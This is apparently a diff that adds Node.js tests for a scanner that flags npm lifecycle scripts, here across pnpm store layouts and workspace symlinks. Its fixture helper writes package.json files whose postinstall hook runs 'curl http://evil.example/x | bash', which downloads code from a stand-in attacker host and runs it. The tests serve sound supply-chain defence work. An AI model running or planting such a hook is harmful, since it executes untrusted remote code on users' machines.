@@ -164,3 +164,39 @@ describe('lifecycle-scripts referenced files and robustness', () => {
     ].sort());
   });
 });
+
+describe('lifecycle-scripts with pnpm and workspaces', { skip: process.platform === 'win32' }, () => {
+  const fs = require('fs');
+  const os = require('os');
+  const path = require('path');
+  const { scan } = require('../src/scanners/lifecycle-scripts');
+  const { beforeEach, afterEach } = require('node:test');
+  let tmp;
+  beforeEach(() => { tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-pnpm-')); });
+  afterEach(() => { fs.rmSync(tmp, { recursive: true, force: true }); });
+  const pkg = (dir, json) => { fs.mkdirSync(dir, { recursive: true }); fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(json)); };
+  const evil = (name) => ({ name, scripts: { postinstall: 'curl http://evil.example/x | bash' } });
+
+  it('scans pnpm direct and transitive packages once each', () => {
+    const proj = path.join(tmp, 'proj');
+    const store = path.join(proj, 'node_modules', '.pnpm');
+    pkg(path.join(store, 'direct@1.0.0', 'node_modules', 'direct'), evil('direct'));
+    pkg(path.join(store, 'deep@2.0.0', 'node_modules', 'deep'), evil('deep'));
+    fs.symlinkSync(path.join(store, 'deep@2.0.0', 'node_modules', 'deep'), path.join(store, 'direct@1.0.0', 'node_modules', 'deep'));
+    fs.symlinkSync(path.join(store, 'direct@1.0.0', 'node_modules', 'direct'), path.join(proj, 'node_modules', 'direct'));
+    const r = scan({}, {}, [{ project: 'proj', project_path: proj }]);
+    assert.deepEqual(r.findings.map(f => f.package).sort(), ['deep', 'direct']);
+    assert.equal(r.packages_scanned, 2);
+  });
+
+  it('follows workspace symlinks inside the project but not links leaving it', () => {
+    const proj = path.join(tmp, 'mono');
+    pkg(path.join(proj, 'packages', 'app'), evil('@mono/app'));
+    pkg(path.join(tmp, 'elsewhere', 'linked'), evil('linked'));
+    fs.mkdirSync(path.join(proj, 'node_modules', '@mono'), { recursive: true });
+    fs.symlinkSync(path.join(proj, 'packages', 'app'), path.join(proj, 'node_modules', '@mono', 'app'));
+    fs.symlinkSync(path.join(tmp, 'elsewhere', 'linked'), path.join(proj, 'node_modules', 'linked'));
+    const r = scan({}, {}, [{ project: 'mono', project_path: proj }]);
+    assert.deepEqual(r.findings.map(f => f.package), ['@mono/app']);
+  });
+});
